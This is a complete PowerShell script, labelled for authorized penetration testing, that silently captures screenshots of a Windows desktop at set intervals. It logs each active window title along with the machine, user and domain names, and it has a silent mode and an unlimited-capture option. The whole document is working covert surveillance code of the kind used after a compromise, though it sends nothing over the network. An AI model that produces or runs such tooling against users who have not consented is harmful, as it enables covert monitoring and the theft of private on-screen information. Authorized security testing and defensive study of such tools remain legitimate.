# Windows Screenshot Capture - Native PowerShell
# No Python Required - For authorized penetration testing only

param(
    [string]$OutputDir = ".\screenshots",
    [int]$Interval = 60,  # Interval in seconds
    [int]$Count = 10,     # Number of screenshots to take (0 = infinite)
    [switch]$Silent
)

function Write-Log {
    param([string]$Message)
    if (-not $Silent) {
        Write-Host "[*] $Message"
    }
}

Write-Log "Windows PowerShell Screenshot Capture"
Write-Log "Output Directory: $OutputDir"
Write-Log "Interval: $Interval seconds"
if ($Count -eq 0) {
    Write-Log "Count: Infinite (Press Ctrl+C to stop)"
} else {
    Write-Log "Count: $Count screenshots"
}
Write-Log "="*50

# Create output directory
New-Item -ItemType Directory -Force -Path $OutputDir | Out-Null

# Load required assemblies
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

function Get-Screenshot {
    param(
        [string]$FilePath
    )
    
    try {
        # Get the primary screen bounds
        $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        
        # Create a bitmap of the appropriate size
        $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
        
        # Create a graphics object from the bitmap
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        
        # Copy the screen to the bitmap
        $graphics.CopyFromScreen(
            $bounds.Location,
            [System.Drawing.Point]::Empty,
            $bounds.Size
        )
        
        # Save the bitmap
        $bitmap.Save($FilePath, [System.Drawing.Imaging.ImageFormat]::Png)
        
        # Cleanup
        $graphics.Dispose()
        $bitmap.Dispose()
        
        return $true
    }
    catch {
        Write-Host "[!] Error capturing screenshot: $_" -ForegroundColor Red
        return $false
    }
}

function Get-ActiveWindowTitle {
    try {
        Add-Type @"
            using System;
            using System.Runtime.InteropServices;
            using System.Text;
            public class WindowHelper {
                [DllImport("user32.dll")]
                public static extern IntPtr GetForegroundWindow();
                
                [DllImport("user32.dll")]
                public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
                
                public static string GetActiveWindowTitle() {
                    const int nChars = 256;
                    StringBuilder buffer = new StringBuilder(nChars);
                    IntPtr handle = GetForegroundWindow();
                    
                    if (GetWindowText(handle, buffer, nChars) > 0) {
                        return buffer.ToString();
                    }
                    return "Unknown";
                }
            }
"@ -ErrorAction SilentlyContinue
        
        return [WindowHelper]::GetActiveWindowTitle()
    }
    catch {
        return "Unknown"
    }
}

function Get-SystemInfo {
    $info = @{
        Computer = $env:COMPUTERNAME
        User = $env:USERNAME
        Domain = $env:USERDOMAIN
        Resolution = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width.ToString() + "x" + [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height.ToString()
    }
    return $info
}

# Create info file
$infoFile = Join-Path $OutputDir "capture_info.txt"
$sysInfo = Get-SystemInfo
$infoText = @"
Screenshot Capture Session
Started: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
Computer: $($sysInfo.Computer)
User: $($sysInfo.User)
Domain: $($sysInfo.Domain)
Screen Resolution: $($sysInfo.Resolution)
Interval: $Interval seconds
Target Count: $(if ($Count -eq 0) { "Infinite" } else { $Count })
"@
Set-Content -Path $infoFile -Value $infoText

Write-Log "System info saved to: $infoFile"

# Main capture loop
$captured = 0
$startTime = Get-Date

try {
    while ($true) {
        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        $filename = "screenshot_$timestamp.png"
        $filepath = Join-Path $OutputDir $filename
        
        Write-Log "Capturing screenshot $($captured + 1)..."
        
        # Get active window for context
        $activeWindow = & { Get-ActiveWindowTitle }
        
        # Capture screenshot
        if (Get-Screenshot -FilePath $filepath) {
            $captured++
            $fileSize = (Get-Item $filepath).Length / 1KB
            Write-Log "Saved: $filename ($([math]::Round($fileSize, 2)) KB) - Active: $activeWindow"
            
            # Log to file
            Add-Content -Path $infoFile -Value "[$timestamp] Screenshot $captured - $activeWindow - $([math]::Round($fileSize, 2)) KB"
        }
        
        # Check if we've reached the count limit
        if ($Count -gt 0 -and $captured -ge $Count) {
            Write-Log "Target count reached."
            break
        }
        
        # Wait for next interval
        if ($Count -eq 0 -or $captured -lt $Count) {
            Write-Log "Waiting $Interval seconds..."
            Start-Sleep -Seconds $Interval
        }
    }
}
catch {
    Write-Host "[!] Capture interrupted: $_" -ForegroundColor Yellow
}
finally {
    $endTime = Get-Date
    $duration = ($endTime - $startTime).TotalSeconds
    
    Write-Log "`nCapture complete!"
    Write-Log "Screenshots captured: $captured"
    Write-Log "Duration: $([math]::Round($duration, 2)) seconds"
    Write-Log "Output directory: $OutputDir"
    
    # Update info file
    Add-Content -Path $infoFile -Value "`nSession Ended: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    Add-Content -Path $infoFile -Value "Total Screenshots: $captured"
    Add-Content -Path $infoFile -Value "Duration: $([math]::Round($duration, 2)) seconds"
    
    # Display summary
    if (-not $Silent) {
        Write-Host "`n[+] Summary:" -ForegroundColor Green
        Write-Host "  Screenshots: $captured" -ForegroundColor Cyan
        Write-Host "  Location: $OutputDir" -ForegroundColor Cyan
        
        $totalSize = (Get-ChildItem -Path $OutputDir -Filter "*.png" | Measure-Object -Property Length -Sum).Sum / 1MB
        Write-Host "  Total Size: $([math]::Round($totalSize, 2)) MB" -ForegroundColor Cyan
    }
}
